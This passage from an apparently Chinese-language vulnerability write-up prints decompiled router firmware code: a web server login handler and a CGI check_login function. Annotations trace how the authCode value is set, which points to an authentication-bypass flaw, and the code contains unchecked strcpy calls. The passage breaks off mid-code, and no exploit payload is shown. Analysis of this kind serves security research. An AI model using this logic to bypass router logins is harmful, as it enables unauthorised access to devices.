class="number">128</span>]; <span class="comment">// [sp+13Ch] [-91Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v19[<span class="number">128</span>]; <span class="comment">// [sp+1BCh] [-89Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v20[<span class="number">128</span>]; <span class="comment">// [sp+23Ch] [-81Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v21[<span class="number">128</span>]; <span class="comment">// [sp+2BCh] [-79Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v22[<span class="number">256</span>]; <span class="comment">// [sp+33Ch] [-71Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v23[<span class="number">512</span>]; <span class="comment">// [sp+43Ch] [-61Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v24[<span class="number">1028</span>]; <span class="comment">// [sp+63Ch] [-41Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> *v25; <span class="comment">// [sp+A40h] [-18h]</span></span><br><span class="line">  <span class="type">char</span> *v26; <span class="comment">// [sp+A44h] [-14h]</span></span><br><span class="line">  <span class="type">int</span> *v27; <span class="comment">// [sp+A48h] [-10h]</span></span><br><span class="line">  <span class="type">char</span> *v28; <span class="comment">// [sp+A4Ch] [-Ch]</span></span><br><span class="line">  <span class="type">char</span> *v29; <span class="comment">// [sp+A50h] [-8h]</span></span><br><span class="line">  <span class="type">char</span> *v30; <span class="comment">// [sp+A54h] [-4h]</span></span><br><span class="line"></span><br><span class="line">  inet_ntoa(*(_DWORD *)(a1 + <span class="number">128</span>));</span><br><span class="line">  <span class="built_in">memset</span>(v19, <span class="number">0</span>, <span class="keyword">sizeof</span>(v19));</span><br><span class="line">  <span class="built_in">memset</span>(v24, <span class="number">0</span>, <span class="number">1024</span>);</span><br><span class="line">  <span class="built_in">memset</span>(v23, <span class="number">0</span>, <span class="keyword">sizeof</span>(v23));</span><br><span class="line">  <span class="built_in">memset</span>(v20, <span class="number">0</span>, <span class="keyword">sizeof</span>(v20));</span><br><span class="line">  v25 = v21;</span><br><span class="line">  <span class="built_in">memset</span>(v21, <span class="number">0</span>, <span class="keyword">sizeof</span>(v21));</span><br><span class="line">  <span class="built_in">memset</span>(v22, <span class="number">0</span>, <span class="keyword">sizeof</span>(v22));</span><br><span class="line">  v6 = *(_DWORD **)(a1 + <span class="number">272</span>);</span><br><span class="line">  v13 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(v22, *v6);</span><br><span class="line">  authCode = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !buffer_is_empty(*(_DWORD *)(a1 + <span class="number">328</span>)) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">strncpy</span>(v24, **(_DWORD **)(a1 + <span class="number">328</span>), <span class="number">1023</span>);</span><br><span class="line">    v27 = &amp;v13;</span><br><span class="line">    v29 = &amp;v17;</span><br><span class="line">    v26 = v24;</span><br><span class="line">    v28 = v19;</span><br><span class="line">    v8 = (<span class="type">int</span>)v25;</span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    v30 = v16;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v25 = (<span class="type">char</span> *)(v9 + <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> ( getNthValueSafe(v9, v26, <span class="number">38</span>, v23) == <span class="number">-1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( getNthValueSafe(<span class="number">0</span>, v23, <span class="number">61</span>, v20) != <span class="number">-1</span> &amp;&amp; getNthValueSafe(<span class="number">1</span>, v23, <span class="number">61</span>, v8) != <span class="number">-1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">strstr</span>(v20, <span class="string">&quot;authCode&quot;</span>) )</span><br><span class="line">          authCode = atoi(v8);</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">strstr</span>(v20, <span class="string">&quot;userName&quot;</span>) )</span><br><span class="line">          <span class="built_in">strcpy</span>(v30, v8);</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">strstr</span>(v20, <span class="string">&quot;password&quot;</span>) )</span><br><span class="line">          <span class="built_in">strcpy</span>(v29, v8);</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">strstr</span>(v20, <span class="string">&quot;goURL&quot;</span>) )</span><br><span class="line">          <span class="built_in">strcpy</span>(v28, v8);</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">strstr</span>(v20, <span class="string">&quot;flag&quot;</span>) )</span><br><span class="line">          <span class="built_in">strcpy</span>(v27, v8);</span><br><span class="line">      &#125;</span><br><span class="line">      v9 = (<span class="type">int</span>)v25;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !v19[<span class="number">0</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strstr</span>(&amp;v13, <span class="string">&quot;ie8&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v10 = <span class="string">&quot;wan_ie.html&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( atoi(&amp;v13) == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v10 = <span class="string">&quot;phone/home.html&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v10 = <span class="string">&quot;home.html&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">strcpy</span>(v19, v10);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( authCode )</span><br><span class="line">  &#123;</span><br><span class="line">    fbss = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v12 = time(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !ws_get_cookie(a1, <span class="string">&quot;SESSION_ID&quot;</span>, v15, <span class="number">0</span>) &amp;&amp; form_get_idx_by_sessionid(&amp;fl_sess, v12, v15) != <span class="number">-1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">sprintf</span>(a2, <span class="string">&quot;http://%s/%s?timestamp=%ld&quot;</span>, v22, v19);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">sprintf</span>(v14, <span class="string">&quot;%ld:%d&quot;</span>, v12, <span class="number">2</span>);</span><br><span class="line">      <span class="built_in">sprintf</span>(v18, <span class="string">&quot;%d:%s&quot;</span>, <span class="number">2</span>, v14);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( form_get_idx_by_sessionid(&amp;fl_sess, v12, v18) != <span class="number">-1</span> );</span><br><span class="line">    <span class="keyword">if</span> ( form_add_session(&amp;fl_sess, &amp;fl_sess_bak, <span class="number">-1</span>, v16) )</span><br><span class="line">    &#123;</span><br><span class="line">      ws_set_cookie(a3, <span class="string">&quot;SESSION_ID&quot;</span>, v18, <span class="number">0</span>);</span><br><span class="line">      <span class="built_in">sprintf</span>(a2, <span class="string">&quot;http://%s/%s?timestamp=%ld&quot;</span>, v22, v19);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ws_clear_cookie(a3, <span class="string">&quot;SESSION_ID&quot;</span>, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">    fbss = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;v13, <span class="string">&quot;ie8&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">sprintf</span>(a2, <span class="string">&quot;http://%s%s&quot;</span>, v22, <span class="string">&quot;/login_ie.html&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( atoi(&amp;v13) == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">sprintf</span>(a2, <span class="string">&quot;http://%s%s%s&quot;</span>, v22, <span class="string">&quot;/phone&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">sprintf</span>(a2, <span class="string">&quot;http://%s%s&quot;</span>, v22, <span class="string">&quot;/login.html&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;v13, <span class="string">&quot;ie8&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sprintf</span>(a2, <span class="string">&quot;http://%s%s&quot;</span>, v22, <span class="string">&quot;/login_ie.html&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( atoi(&amp;v13) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sprintf</span>(a2, <span class="string">&quot;http://%s%s%s&quot;</span>, v22, <span class="string">&quot;/phone&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sprintf</span>(a2, <span class="string">&quot;http://%s%s&quot;</span>, v22, <span class="string">&quot;/login.html&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果<code>authCode</code>不为0,可以获得一个有效的<code>&quot;SESSION_ID&quot;</code>,表示登录成功</p>
+<p>在<code>cgi</code>的登录行为中,我们可以发现</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">check_login</span><span class="params">(<span class="type">int</span> jsonData)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *loginAuthUrl; <span class="comment">// $s5</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// $s2</span></span><br><span class="line">  <span class="type">char</span> *input_username; <span class="comment">// $s2</span></span><br><span class="line">  <span class="type">char</span> *input_password; <span class="comment">// $s5</span></span><br><span class="line">  <span class="type">char</span> *http_host; <span class="comment">// $s3</span></span><br><span class="line">  <span class="type">char</span> *flag; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">char</span> *verify; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> verifyValue; <span class="comment">// $s4</span></span><br><span class="line">  <span class="type">int</span> wizard_flag; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// $s6</span></span><br><span class="line">  <span class="type">char</span> *http_username; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">char</span> *http_passwd; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// $s3</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// $s3</span></span><br><span class="line">  BOOL authCode; <span class="comment">// $s3</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> v20; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">char</span> *v21; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">char</span> goURL[<span class="number">128</span>]; <span class="comment">// [sp+28h] [-1830h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v24[<span class="number">4096</span>]; <span class="comment">// [sp+A8h] [-17B0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v25[<span class="number">64</span>]; <span class="comment">// [sp+10A8h] [-7B0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v26[<span class="number">1024</span>]; <span class="comment">// [sp+10E8h] [-770h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v27[<span class="number">128</span>]; <span class="comment">// [sp+14E8h] [-370h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v28[<span class="number">256</span>]; <span class="comment">// [sp+1568h] [-2F0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> host[<span class="number">256</span>]; <span class="comment">// [sp+1668h] [-1F0h] BYREF</span></span><br><span class="line">  <span class="type">int</span> http_username_cp[<span class="number">8</span>]; <span class="comment">// [sp+1768h] [-F0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v31; <span class="comment">// [sp+1788h] [-D0h]</span></span><br><span class="line">  <span class="type">int</span> http_passwd_cp[<span class="number">8</span>]; <span class="comment">// [sp+178Ch] [-CCh] BYREF</span></span><br><span class="line">  <span class="type">char</span> v33; <span class="comment">// [sp+17ACh] [-ACh]</span></span><br><span class="line">  <span class="type">int</span> v34[<span class="number">8</span>]; <span class="comment">// [sp+17B0h] [-A8h] BYREF</span></span><br><span class="line">  <span class="type">char</span> urlDecode_password[<span class="number">64</span>]; <span class="comment">// [sp+17D0h] [-88h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v36[<span class="number">16</span>]; <span class="comment">// [sp+1810h] [-48h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *v37; <span class="comment">// [sp+1850h] [-8h]</span></span><br><span class="line">  <span class="type">int</span> tmpCJson; <span class="comment">// [sp+1854h] [-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(goURL, <span class="number">0</span>, <span class="keyword">sizeof</span>(goURL));</span><br><span class="line">  <span class="built_in">memset</span>(v24, <span class="number">0</span>, <span class="keyword">sizeof</span>(v24));</span><br><span class="line">  <span class="built_in">memset</span>(v25, <span class="number">0</span>, <span class="keyword">sizeof</span>(v25));</span><br><span class="line">  <span class="built_in">memset</span>(v26, <span class="number">0</span>, <span class="keyword">sizeof</span>(v26));</span><br><span class="line">  <span class="built_in">memset</span>(v27, <span class="number">0</span>, <span class="keyword">sizeof</span>(v27));</span><br><span class="line">  <span class="built_in">memset</span>(v28, <span class="number">0</span>, <span class="keyword">sizeof</span>(v28));</span><br><span class="line">  <span class="built_in">memset</span>(host, <span class="number">0</span>, <span class="keyword">sizeof</span>(host));</span><br><span class="line">  http_username_cp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  http_username_cp[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  http_username_cp[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">  http_username_cp[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">  http_username_cp[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">  http_username_cp[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">  http_username_cp[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">  http_username_cp[<span class="number">7</span>] = <span class="number">0</span>;</span><br><span class="line">  v31 = <span class="number">0</span>;</span><br><span class="line">  http_passwd_cp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  http_passwd_cp[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  http_passwd_cp[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">  http_passwd_cp[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">  http_passwd_cp[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">  http_passwd_cp[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">  http_passwd_cp[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">  http_passwd_cp[<span class="number">7</span>] = <span class="number">0</span>;</span><br><span class="line">  v33 = <span class="number">0</span>;</span><br><span class="line">  v34[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  v34[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v34[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">  v34[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">  v34[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">  v34[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">  v34[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">  v34[<span class="number">7</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(urlDecode_password, <span class="number">0</span>, <span class="keyword">sizeof</span>(urlDecode_password));</span><br><span class="line">  loginAuthUrl = websGetVar(jsonData, <span class="string">&quot;loginAuthUrl&quot;</span>, (<span class="type">char</span> *)<span class="string">&quot;&quot;</span>);</span><br><span class="line">  tmpCJson = cJSON_CreateObject();</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  v37 = v28;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = v3 + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( getNthValueSafe(v3, loginAuthUrl, <span class="string">&quot;&amp;&quot;</span>, v26, <span class="number">1024</span>) == <span class="number">-1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( getNthValueSafe(<span class="number">0</span>, v26, <span class="string">&quot;=&quot;</span>, v27, <span class="number">128</span>) != <span class="number">-1</span> &amp;&amp; getNthValueSafe(<span class="number">1</span>, v26, <span class="string">&quot;=&quot;</span>, v37, <span class="number">256</span>) != <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = cJSON_CreateString(v37);</span><br><span class="line">      cJSON_AddItemToObject(tmpCJson, v27, v4);</span><br><span class="line">    &#125;</span><br><span class="line">    v3 = v5;</span><br><span class="line">  &#125;</span><br><span class="line">  input_username = websGetVar(tmpCJson, <span class="string">&quot;username&quot;</span>, (<span class="type">char</span> *)<span class="string">&quot;&quot;</span>);	<span class="comment">// 获取用户输入的账号（默传入的账号为admin）</span></span><br><span class="line">  input_password = websGetVar(tmpCJson, <span class="string">&quot;password&quot;</span>, (<span class="type">char</span> *)<span class="string">&quot;&quot;</span>);	<span class="comment">// 获取用户输入的密码</span></span><br><span class="line">  http_host = websGetVar(tmpCJson, <span class="string">&quot;http_host&quot;</span>, (<span class="type">char</span> *)<span class="string">&quot;&quot;</span>);</span><br><span class="line">  flag = websGetVar(tmpCJson, <span class="string">&quot;flag&quot;</span>, (<span class="type">char</span> *)&amp;word_4370EC);</span><br><span class="line">  verify = websGetVar(tmpCJson, <span class="string">&quot;verify&quot;</span>, (<span class="type">char</span> *)&amp;word_4370EC);</span><br><span class="line">  verifyValue = atoi(verify);</span><br><span class="line">  wizard_flag = nvram_get_int(<span class="string">&quot;wizard_flag&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( wizard_flag )</span><br><span class="line">  &#123;</span><br><span class="line">    v13 = nvram_safe_get(<span class="string">&quot;opmode_custom&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( nvram_get_int(<span class="string">&quot;ren_qing_style&quot;</span>) == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      wizard_flag = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( (!<span class="built_in">strcmp</span>(v13, <span class="string">&quot;gw&quot;</span>) || !<span class="built_in">strcmp</span>(v13, <span class="string">&quot;wisp&quot;</span>)) &amp;&amp; isWanConnected()</span><br><span class="line">           || !<span class="built_in">strcmp</span>(v13, <span class="string">&quot;rpt&quot;</span>) &amp;&amp; get_apcli_connected() == <span class="number">1</span></span><br><span class="line">           || !<span class="built_in">strcmp</span>(v13, <span class="string">&quot;br&quot;</span>) &amp;&amp; nvram_get_int(<span class="string">&quot;dl_status_lan&quot;</span>) == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      wizard_flag = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  urldecode((<span class="type">int</span>)input_password, urlDecode_password);</span><br><span class="line">  http_username = (<span class="type">char</span> *)nvram_safe_get(<span class="string">&quot;http_username&quot;</span>);			<span class="comment">// 获取路由器硬件中的账号</span></span><br><span class="line">  <span class="built_in">strcpy</span>((<span class="type">char</span> *)http_username_cp, http_username);</span><br><span class="line">  http_passwd = (<span class="type">char</span> *)nvram_safe_get(<span class="string">&quot;http_passwd&quot;</span>);				<span class="comment">// 获取路由器硬件中的密码</span></span><br><span class="line">  <span class="built_in">strcpy</span>((<span class="type">char</span> *)http_passwd_cp, http_passwd);</span><br><span class="line">  <span class="keyword">if</span> ( *http_host )</span><br><span class="line">    <span class="built_in">strcpy</span>(host, http_host);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">strcpy</span>(host, (<span class="type">char</span> *)v34);</span><br><span class="line">  <span class="keyword">if</span> ( verifyValue == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v16 = nvram_get_int(<span class="string">&quot;verify_code_flag&quot;</span>) + <span class="number">1</span>;</span><br><span class="line">    nvram_set_int_temp(<span class="string">&quot;verify_code_flag&quot;</span>, v16);</span><br><span class="line">    <span class="keyword">if</span> ( v16 &gt;= <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sysinfo(v36);</span><br><span class="line">      <span class="built_in">sprintf</span>(v25, <span class="string">&quot;%ld&quot;</span>, v36[<span class="number">0</span>]);</span><br><span class="line">      nvram_set_temp(<span class="string">&quot;tmp_sys_uptime&quot;</span>, v25);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(flag, <span class="string">&quot;ie8&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">strcpy</span>(goURL, <span class="string">&quot;login_ie.html&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( atoi(flag) == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">strcpy</span>(goURL, <span class="string">&quot;phone/login.html&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">strcpy</span>(goURL, <span class="string">&quot;login.html&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_54;</span><br><span class="line">  &#125;</span><br><span class="line">  nvram_set_int_temp(<span class="string">&quot;verify_code_flag&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  nvram_set_int_temp(<span class="string">&quot;tmp_sys_uptime&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  v17 = <span class="built_in">strcmp</span>(input_username, http_username_cp);				<span class="comment">// 检查输入的username是否正确</span></span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(urlDecode_password, http_passwd_cp) )				<span class="comment">// 检查输入的password是否正确  </span></span><br><span class="line">    authCode = v17 != <span class="number">0</span>;                                                        <span class="comment">// 根据检查确定authCode的值</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    authCode = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( flag )</span><br><span class="line">    <span class="built_in">strcpy</span>(input_username, (<span class="type">char</span> *)http_username_cp);	<span class="comment">// 若flag未设置，则input_username默认为admin（strcpy）</span></span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(input_username, http_username_cp) &amp;&amp; !<span class="built_in">strcmp</span>(urlDecode_password, http_passwd_cp)</span><br><span class="line">    || nvram_get_int(<span class="string">&quot;ren_qing_style&quot;</span>) == <span class="number">1</span> &amp;&amp; !*(_BYTE *)nvram_safe_get(<span class="string">&quot;http_passwd&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(flag, <span class="string">&quot;ie8&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span 